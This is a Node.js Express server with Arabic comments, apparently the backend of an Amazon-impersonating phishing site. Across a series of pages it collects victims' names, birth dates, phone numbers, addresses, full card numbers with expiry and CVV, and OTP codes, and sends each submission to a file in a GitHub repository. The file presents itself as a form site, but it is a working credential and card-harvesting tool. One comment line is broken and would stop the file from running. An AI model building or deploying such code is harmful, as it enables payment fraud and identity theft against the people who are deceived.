const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 8085;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

// ========== إعدادات GitHub ==========
const GITHUB_TOKEN = process.env.GITHUB_TOKEN; 👈 حط التوكن بتاعك هنا
const REPO_OWNER = 'afffaaaa28-glitch';
const REPO_NAME = 'amazon-form-site';
const FILE_PATH = 'data.txt';

// ========== دالة حفظ البيانات على GitHub ==========
async function saveToGitHub(data) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
    const content = Buffer.from(data).toString('base64');

    let sha = '';
    try {
        const getRes = await fetch(url, {
            headers: { Authorization: `token ${GITHUB_TOKEN}` }
        });
        if (getRes.ok) {
            const fileInfo = await getRes.json();
            sha = fileInfo.sha;
        }
    } catch (err) {
        console.log('📄 الملف مش موجود، هيتعمل جديد');
    }

    const body = {
        message: `تحديث البيانات - ${new Date().toLocaleString('ar-EG')}`,
        content: content,
        sha: sha
    };

    const res = await fetch(url, {
        method: 'PUT',
        headers: {
            Authorization: `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    });

    if (!res.ok) {
        throw new Error(`GitHub Error: ${res.status}`);
    }
    return await res.json();
}

// ============================================
// مسارات عرض الصفحات (GET)
// ============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page1.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page3.html'));
});

app.get('/page4', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page4.html'));
});

app.get('/page5', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page5.html'));
});

// ============================================
// مسار استقبال بيانات العنوان
// ============================================
app.post('/submit-data', async (req, res) => {
    console.log('📥 البيانات المستلمة من الفورم:');
    console.log(req.body);

    const { 
        username, 
        dob_month, 
        dob_day, 
        dob_year, 
        phone, 
        country, 
        address_line1, 
        address_line2, 
        city, 
        state, 
        zipcode,
        billing_username_hidden,
        billing_address_line1_hidden,
        billing_address_line2_hidden,
        billing_city_hidden,
        billing_state_hidden,
        billing_zipcode_hidden,
        billing_phone_hidden
    } = req.body;

    const billing_username = billing_username_hidden || '';
    const billing_address_line1 = billing_address_line1_hidden || '';
    const billing_address_line2 = billing_address_line2_hidden || '';
    const billing_city = billing_city_hidden || '';
    const billing_state = billing_state_hidden || '';
    const billing_zipcode = billing_zipcode_hidden || '';
    const billing_phone = billing_phone_hidden || '';

    const hasBillingData = billing_username || billing_address_line1 || billing_city || billing_state || billing_zipcode;

    const isBillingSameAsShipping = (
        hasBillingData &&
        billing_username === username &&
        billing_address_line1 === address_line1 &&
        billing_address_line2 === (address_line2 || '') &&
        billing_city === city &&
        billing_state === (state || '') &&
        billing_zipcode === (zipcode || '') &&
        billing_phone === (phone || '')
    );

    let logData = `========================================
   بيانات الشحن والعنوان المستلمة
========================================

📦 **بيانات الشحن (Shipping):**
----------------------------------------
الاسم الكامل        : ${username}
تاريخ الميلاد       : ${dob_month}/${dob_day}/${dob_year}
رقم الهاتف          : ${phone}
الدولة/المنطقة      : ${country}
العنوان (سطر 1)     : ${address_line1}
العنوان (سطر 2)     : ${address_line2 || 'غير محدد'}
المدينة             : ${city}
المحافظة/الولاية    : ${state || 'غير محدد'}
الرمز البريدي       : ${zipcode || 'غير محدد'}

💳 **بيانات الفوترة (Billing):**
----------------------------------------`;

    if (!hasBillingData) {
        logData += `
🔄 **لم يتم إدخال عنوان فوترة** (سيتم استخدام عنوان الشحن)
`;
    } else if (isBillingSameAsShipping) {
        logData += `
🔄 **نفس عنوان الشحن** ✅
`;
    } else {
        logData += `
الاسم الكامل        : ${billing_username || 'غير محدد'}
العنوان (سطر 1)     : ${billing_address_line1 || 'غير محدد'}
العنوان (سطر 2)     : ${billing_address_line2 || 'غير محدد'}
المدينة             : ${billing_city || 'غير محدد'}
المحافظة/الولاية    : ${billing_state || 'غير محدد'}
الرمز البريدي       : ${billing_zipcode || 'غير محدد'}
رقم الهاتف          : ${billing_phone || 'غير محدد'}
`;
    }

    logData += `
----------------------------------------
التاريخ والوقت: ${new Date().toLocaleString('ar-EG')}
========================================`;

    try {
        await saveToGitHub(logData);
        console.log('✅ البيانات اتحفظت على GitHub');
        res.redirect('/page3');
    } catch (err) {
        console.error("❌ حدث خطأ أثناء حفظ البيانات:", err);
        return res.status(500).send("حدث خطأ داخلي في السيرفر");
    }
});

// ============================================
// مسار استقبال بيانات الدفع
// ============================================
app.post('/submit-payment', async (req, res) => {
    const { card_name, card_number, card_expiry, card_cvv } = req.body;

    const paymentContent = `========================================
       بيانات بطاقة الدفع المستلمة
========================================
اسم صاحب البطاقة: ${card_name}
رقم البطاقة     : ${card_number}
تاريخ الانتهاء   : ${card_expiry}
الرمز السري CVV  : ${card_cvv}
التاريخ والوقت   : ${new Date().toLocaleString('ar-EG')}
----------------------------------------`;

    try {
        await saveToGitHub(paymentContent);
        console.log('✅ بيانات البطاقة اتحفظت على GitHub');
        res.redirect('/page4');
    } catch (err) {
        console.error("❌ حدث خطأ أثناء حفظ بيانات الدفع:", err);
        return res.status(500).send("حدث خطأ في السيرفر أثناء معالجة الدفع");
    }
});

// ============================================
// مسار استقبال الـ OTP
// ============================================
app.post('/submit-otp', async (req, res) => {
    const { otp_code } = req.body;

    const otpContent = `========================================
         رمز الـ OTP المستلم
========================================
رمز التحقق (OTP): ${otp_code}
التاريخ والوقت   : ${new Date().toLocaleString('ar-EG')}
----------------------------------------`;

    try {
        await saveToGitHub(otpContent);
        console.log('✅ كود OTP اتحفظ على GitHub');
        res.redirect('/page5');
    } catch (err) {
        console.error("❌ حدث خطأ أثناء حفظ رمز OTP:", err);
        return res.status(500).send("حدث خطأ في السيرفر أثناء معالجة رمز التحقق");
    }
});

// ============================================
// تشغيل السيرفر
// ============================================
app.listen(PORT, () => {
    console.log(`==================================================`);
    console.log(`[*] السيرفر يعمل الآن على: http://localhost:${PORT}`);
    console.log(`==================================================`);
    console.log(`[📂] البيانات هتتحفظ على GitHub في ملف data.txt`);
    console.log(`==================================================`);
});
